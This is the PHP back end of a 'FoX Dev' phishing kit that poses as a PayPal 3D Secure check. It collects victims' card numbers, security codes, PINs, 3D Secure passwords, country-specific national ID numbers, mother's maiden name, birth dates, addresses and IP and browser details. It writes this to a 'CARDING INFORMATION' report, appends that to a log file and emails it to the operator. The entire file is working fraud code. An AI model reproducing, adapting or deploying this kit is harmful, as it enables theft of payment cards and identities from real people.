
<?php

session_start();


if(trim($_SESSION['country1']) == "United States"){
$_SESSION['_SSN_']      = $_POST['SSN'];
$marshall_3dscrityscty .= '
<h1><p>Social Security Number :<a>'.$_SESSION['_SSN_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Canada"){
$_SESSION['_sin_']      = $_POST['sin'];
$marshall_3dscrityscty .= '<h1><p>Soci&#97;l Insur&#97;nce Number :<a>'.$_SESSION['_birthdate_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "United Kingdom"){
$_SESSION['_NIN_']      = $_POST['NIN'];
$marshall_3dscrityscty .= '
<h1><p>N&#97;tional Insur&#97;nce Number :<a>'.$_SESSION['_birthdate_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Italy"){
$_SESSION['_FCN_']      = $_POST['FCN'];
$marshall_3dscrityscty .= '
<h1><p>Fiscal Code Number :<a>'.$_SESSION['_birthdate_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Ireland"){
$_SESSION['_irpps_']      = $_POST['irpps'];
$_SESSION['_mmn_']      = $_POST['mmn'];
$marshall_3dscrityscty .= '
<h1><p>Personal Public Service Number :<a>'.$_SESSION['_irpps_'].'</p></a></h1>
<h1><p>Mother M&#97;iden Name :<a>'.$_SESSION['_mmn_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Brazil"){
$_SESSION['_cpfbr_']      = $_POST['cpfbr'];
$marshall_3dscrityscty .= '
<h1><p>CPF Number :<a>'.$_SESSION['_cpfbr_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Netherlands"){
$_SESSION['_BSN_']      = $_POST['BSN'];
$marshall_3dscrityscty .= '
<h1><p>Citizen Service Number/SOFI :<a>'.$_SESSION['_BSN_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Spain"){
$_SESSION['_DNI_']      = $_POST['DNI'];
$marshall_3dscrityscty .= '
<h1><p>National Identity Document Number :<a>'.$_SESSION['_DNI_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Sweden"){
$_SESSION['_SID_']      = $_POST['SID'];
$marshall_3dscrityscty .= '
<h1><p>Personal Identity Number :<a>'.$_SESSION['_SID_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Australia"){
$_SESSION['_OSID_']      = $_POST['OSID'];
$marshall_3dscrityscty .= '
<h1><p>Online Shopping ID :<a>'.$_SESSION['_OSID_'].'</p></a></h1>'; }


include("system.php");

$_SESSION['_namebank_']      = $_POST['namebank'];
$_SESSION['_DSecure_']     = $_POST['DSecure'];
$_SESSION['_CardPIN_']        = $_POST['CardPIN'];


$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	




$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");


$marshall_email .= "<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;border-style: solid;border-color: coral;width: 510px;background: url();background-repeat: no-repeat;background-position: center;'>
●•۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰•●<br/>
±±±±±±±±±±[ <font style='color: #FF358B;'>CARDING INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🚩</font> COUNTRY = </font> <font style='color:#010101;'>".$_SESSION."</font><br>
<font style='color:#9c0000;'>🕘</font> DATE Rezult = <font style='color:#0070ba;'>".$InfoDATE."</font><br>
<font style='color:#9c0000;'>🔖</font> TYPE CARD = <font style='color:#0070ba;'>".$_SESSION['_ccbrand_']."</font><br>
<font style='color:#9c0000;'>👨</font> Cardholder Name = <font style='color:#0070ba;'>".$_SESSION['_NameOnCard_']."</font><br>
<font style='color:#9c0000;'>💳</font> Card Number = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font><br>
<font style='color:#9c0000;'>⏳</font> Date = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
<font style='color:#9c0000;'>🔒</font> Security Code = <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>3D INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🔐</font> 3D Secure = <font style='color:#0070ba;'>".$_SESSION['_DSecure_']."</font><br>
".$marshall_3dscrityscty."
<font style='color:#9c0000;'>🍼</font> Date Of Birth = <font style='color:#0070ba;'>".$_SESSION['_birthdate_']."</font><br>
<font style='color:#9c0000;'>🗝</font> Card Pin = <font style='color:#0070ba;'>".$_SESSION['_CardPIN_']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>BILLING INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>👱‍</font> First Name = <font style='color:#0070ba;'>".$_SESSION['_Firstname_']."</font><br>
<font style='color:#9c0000;'>👨</font> Last Name = <font style='color:#0070ba;'>".$_SESSION['_LastName_']."</font><br>
<font style='color:#9c0000;'>🏚</font> Address line = <font style='color:#0070ba;'>".$_SESSION['_addres_']."</font><br>
<font style='color:#9c0000;'>💒</font> City = <font style='color:#0070ba;'>".$_SESSION['_City_']."</font><br>
<font style='color:#9c0000;'>🏤</font> Province/State = <font style='color:#0070ba;'>".$_SESSION['_State_']."</font><br>
<font style='color:#9c0000;'>📫</font> Zip Code = <font style='color:#0070ba;'>".$_SESSION['_zipCod_']."</font><br>
<font style='color:#9c0000;'>📱</font> phone Number = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
±±±±±±±±±±[ <font style='color: #FF358B;'>VICTIME INFORMATION</font> ]±±±±±±±±±±<br>
<font style='color:#9c0000;'>🗺</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>💻</font> SYS = <font style='color:#0070ba;'>".$OS."</font><br>
<font style='color:#9c0000;'>🌀</font> BROWSER = <font style='color:#0070ba;'>".$browserTy_Version."</font><br>
<font style='color:#9c0000;'>🍁</font> ADRESS IP = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
●•۰۰۰•●<font style='color: #9009A5;border-color:#ff9900;'>FoX Dev</font>●•۰۰۰۰•●<br/>
</div></html>";   
include("sand_email.php");
$f = fopen("../../FoxDev.html", "a");
fwrite($f, $marshall_email);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "3D Secure Card PayPal [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']."] ";
$headers .= "From: ◙[•♥•FoX Dev 4•♥•]◙ <dev@fox.com>" . "\r\n";
mail($yourmail, $subject, $marshall_email , $headers);




?>





